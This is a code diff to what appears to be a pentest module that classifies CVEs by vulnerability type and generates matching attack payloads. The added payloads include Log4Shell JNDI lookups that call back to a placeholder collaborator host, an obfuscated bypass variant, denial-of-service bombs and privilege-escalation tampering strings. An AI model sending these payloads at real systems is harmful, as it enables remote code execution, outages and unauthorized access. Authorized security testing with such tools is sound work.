@@ -44,7 +44,7 @@ _CVE_PATTERNS = [
     # (regex on description, vuln_type, base_severity)
     (r"sql\s*inject|sqli|sql\s+command", "sqli", "critical"),
     (r"cross.?site\s*script|xss|script\s*inject", "xss", "high"),
-    (r"remote\s*code\s*execut|rce|command\s*inject|os\s*command", "rce", "critical"),
+    (r"remote\s*code\s*execut|\brce\b|command\s*inject|os\s*command|jndi\s*inject|log4j|code\s*execut|arbitrary\s*code", "rce", "critical"),
     (r"server.?side\s*request\s*forg|ssrf", "ssrf", "high"),
     (r"server.?side\s*template\s*inject|ssti", "ssti", "critical"),
     (r"path\s*travers|directory\s*travers|\.\.\/|local\s*file\s*inclus|lfi", "lfi", "high"),
@@ -53,9 +53,9 @@ _CVE_PATTERNS = [
     (r"insecure\s*deseria|deserialization|object\s*inject", "deserialization", "critical"),
     (r"open\s*redirect|url\s*redirect|redirect\s*bypass", "open_redirect", "medium"),
     (r"cross.?site\s*request\s*forg|csrf|xsrf", "csrf", "medium"),
-    (r"authentication\s*bypass|auth\s*bypass|login\s*bypass", "auth_bypass", "critical"),
-    (r"privilege\s*escalat|priv\s*esc|unauthorized\s*access", "privesc", "high"),
-    (r"denial\s*of\s*service|dos\s+|ddos|resource\s*exhaust", "dos", "medium"),
+    (r"authentication\s*bypass|auth\s*bypass|login\s*bypass|bypass\w*\s+(?:\w+\s+){0,3}authenticat", "auth_bypass", "critical"),
+    (r"privilege\s*escalat|priv\s*esc|unauthorized\s*access|elevation\s*of\s*privilege", "privesc", "high"),
+    (r"denial\s*of\s*service|\bdos\b|ddos|resource\s*exhaust|resource\s*consumpt", "dos", "medium"),
     (r"buffer\s*overflow|stack\s*overflow|heap\s*overflow", "overflow", "critical"),
     (r"information\s*disclos|info\s*leak|data\s*expos", "info_disclosure", "medium"),
     (r"idor|insecure\s*direct\s*object|broken\s*access", "idor", "high"),
@@ -94,6 +94,9 @@ _PAYLOAD_TEMPLATES: Dict[str, List[Dict[str, str]]] = {
         {"payload": "`id`", "context": "backtick execution", "technique": "backtick"},
         {"payload": "127.0.0.1%0aid", "context": "newline injection", "technique": "crlf"},
         {"payload": "{${sleep(5)}}", "context": "expression language", "technique": "el_injection"},
+        {"payload": "${jndi:ldap://BURP_COLLAB/a}", "context": "Log4Shell JNDI", "technique": "jndi_lookup"},
+        {"payload": "${jndi:dns://BURP_COLLAB}", "context": "Log4Shell DNS OOB", "technique": "jndi_dns"},
+        {"payload": "${${lower:j}${lower:n}${lower:d}i:ldap://BURP_COLLAB/a}", "context": "Log4Shell bypass", "technique": "jndi_obfuscated"},
     ],
     "ssrf": [
         {"payload": "http://127.0.0.1", "context": "localhost access", "technique": "direct"},
@@ -157,6 +160,35 @@ _PAYLOAD_TEMPLATES: Dict[str, List[Dict[str, str]]] = {
         {"payload": "Transfer-Encoding: chunked\\r\\nTransfer-Encoding: x", "context": "TE.TE", "technique": "te_te"},
         {"payload": "Content-Length: 0\\r\\nTransfer-Encoding: chunked", "context": "CL.TE", "technique": "cl_te"},
     ],
+    "dos": [
+        {"payload": "GET / HTTP/1.1\r\nHost: TARGET\r\n" * 50, "context": "request flood", "technique": "repeated_request"},
+        {"payload": '{"query":"{' + 'a(b:{' * 30 + '}}' * 30 + '}"}', "context": "nested JSON DoS", "technique": "json_bomb"},
+        {"payload": "<xml>" + "<a>" * 100000 + "</a>" * 100000 + "</xml>", "context": "XML bomb", "technique": "billion_laughs"},
+        {"payload": "A" * 100000, "context": "large payload", "technique": "buffer_overflow"},
+    ],
+    "privesc": [
+        {"payload": '{"role": "admin"}', "context": "role escalation", "technique": "mass_assignment"},
+        {"payload": '{"is_admin": true, "user_type": "superuser"}', "context": "privilege field tampering", "technique": "field_injection"},
+        {"payload": 'X-Forwarded-For: 127.0.0.1', "context": "IP-based privilege", "technique": "header_spoof"},
+        {"payload": '{"user_id": 1}', "context": "admin ID substitution", "technique": "idor_privesc"},
+        {"payload": '../../../admin', "context": "path traversal to admin", "technique": "path_traversal"},
+    ],
+}
+
+# ── CWE → Vulnerability Type Mapping ─────────────────────────────────────────
+
+_CWE_MAP = {
+    "CWE-79": "xss", "CWE-89": "sqli", "CWE-78": "rce", "CWE-77": "rce",
+    "CWE-94": "rce", "CWE-918": "ssrf", "CWE-22": "lfi", "CWE-611": "xxe",
+    "CWE-502": "deserialization", "CWE-601": "open_redirect", "CWE-352": "csrf",
+    "CWE-287": "auth_bypass", "CWE-269": "privesc", "CWE-400": "dos",
+    "CWE-120": "overflow", "CWE-200": "info_disclosure", "CWE-639": "idor",
+    "CWE-1321": "prototype_pollution", "CWE-113": "crlf", "CWE-90": "ldap_injection",
+    "CWE-643": "xpath_injection", "CWE-362": "race_condition",
+    "CWE-284": "auth_bypass", "CWE-306": "auth_bypass", "CWE-862": "idor",
+    "CWE-863": "privesc", "CWE-98": "rfi", "CWE-434": "rce",
+    "CWE-476": "dos", "CWE-787": "overflow", "CWE-416": "overflow",
+    "CWE-190": "overflow", "CWE-776": "dos", "CWE-444": "smuggling",
 }
 
 # Default payloads for unmapped types
@@ -216,6 +248,14 @@ def _extract_cve_info(cve_data: Dict[str, Any]) -> Dict[str, Any]:
             cvss_severity = cvss_data.get("baseSeverity", "")
             break
 
+    # CWE IDs
+    cwe_ids = []
+    for weakness in cve_data.get("weaknesses", []):
+        for wd in weakness.get("description", []):
+            val = wd.get("value", "")
+            if val.startswith("CWE-"):
+                cwe_ids.append(val)
+
     # Affected software (CPE)
     configs = cve_data.get("configurations", [])
     affected = []
@@ -240,6 +280,7 @@ def _extract_cve_info(cve_data: Dict[str, Any]) -> Dict[str, Any]:
         "description": desc,
         "cvss_score": cvss_score,
         "cvss_severity": cvss_severity,
+        "cwe_ids": cwe_ids,
         "affected_software": affected[:10],
         "references": refs[:10],
     }
@@ -280,8 +321,17 @@ def _extract_parameters(description: str) -> Dict[str, str]:
     if param_matches:
         params["parameter"] = param_matches[0]
 
-    # Extract endpoint paths
-    path_matches = re.findall(r'(/[\w/.-]+)', description)
+    # Extract endpoint paths — strip URLs first, then find bare paths
+    desc_no_urls = re.sub(r'https?://\S+', '', description)
+    path_matches = re.findall(r'(/[\w/.-]+)', desc_no_urls)
+    # Filter out version strings, short noise paths, and common English fragments
+    _PATH_NOISE = {"/or", "/to", "/a", "/an", "/the", "/in", "/on", "/of", "/is", "/it",
+                   "/as", "/at", "/by", "/be", "/if", "/no", "/do", "/up", "/so"}
+    path_matches = [p for p in path_matches if
+                    not p.startswith('//') and
+                    not re.match(r'^/\d+\.\d+', p) and
+                    len(p) > 3 and
+                    p.lower() not in _PATH_NOISE]
     if path_matches:
         params["path"] = path_matches[0]
 
@@ -332,20 +382,44 @@ def generate_payloads_from_cve(
             result["error"] = f"Could not fetch CVE data for {cve_id}"
             # Fall through — if description is provided we can still work
 
+    cwe_ids: List[str] = []
     if cve_data:
         info = _extract_cve_info(cve_data)
         result["cve_id"] = info["cve_id"]
         result["description"] = info["description"]
         result["cvss_score"] = info["cvss_score"]
         result["affected_software"] = info["affected_software"]
+        cwe_ids = info.get("cwe_ids", [])
+        result["cwe_ids"] = cwe_ids
         description = info["description"]
 
     if not description:
         result["error"] = "No CVE data or description provided"
         return result
 
-    # Step 2: Classify vulnerability type
+    # Step 2: Classify vulnerability type (description-based)
     vuln_matches = _classify_vuln(description)
+
+    # Step 2b: If only "unknown" matched, try CWE-based classification
+    if len(vuln_matches) == 1 and vuln_matches[0][0] == "unknown" and cwe_ids:
+        cwe_matches = []
+        for cwe_id in cwe_ids:
+            if cwe_id in _CWE_MAP:
+                vtype = _CWE_MAP[cwe_id]
+                # Infer severity from CVSS if available
+                score = result.get("cvss_score", 0.0)
+                if score >= 9.0:
+                    sev = "critical"
+                elif score >= 7.0:
+                    sev = "high"
+                elif score >= 4.0:
+                    sev = "medium"
+                else:
+                    sev = "low"
+                cwe_matches.append((vtype, sev))
+        if cwe_matches:
+            vuln_matches = cwe_matches
+
     result["vuln_types"] = [{"type": vt, "severity": sev} for vt, sev in vuln_matches]
 
     # Step 3: Extract parameters
